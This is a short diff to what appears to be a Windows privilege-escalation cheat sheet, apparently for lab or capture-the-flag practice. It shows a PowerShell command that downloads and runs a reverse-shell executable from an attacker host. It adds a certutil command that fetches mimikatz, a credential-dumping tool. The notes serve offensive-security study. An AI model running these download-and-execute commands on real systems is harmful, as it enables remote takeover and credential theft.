@@ -37,6 +37,10 @@ windows
 ```
 powershell -c wget "http://10.13.47.80:4444/reverse.exe" -outfile "C:\PrivEsc\reverse.exe"
 
+#or
+
+certutil -urlcache -f http://10.10.136.116:4444/mimikatz_x86.exe mimikatz_x86.exe
+
 C:\PrivEsc\reverse.exe
 ```
 
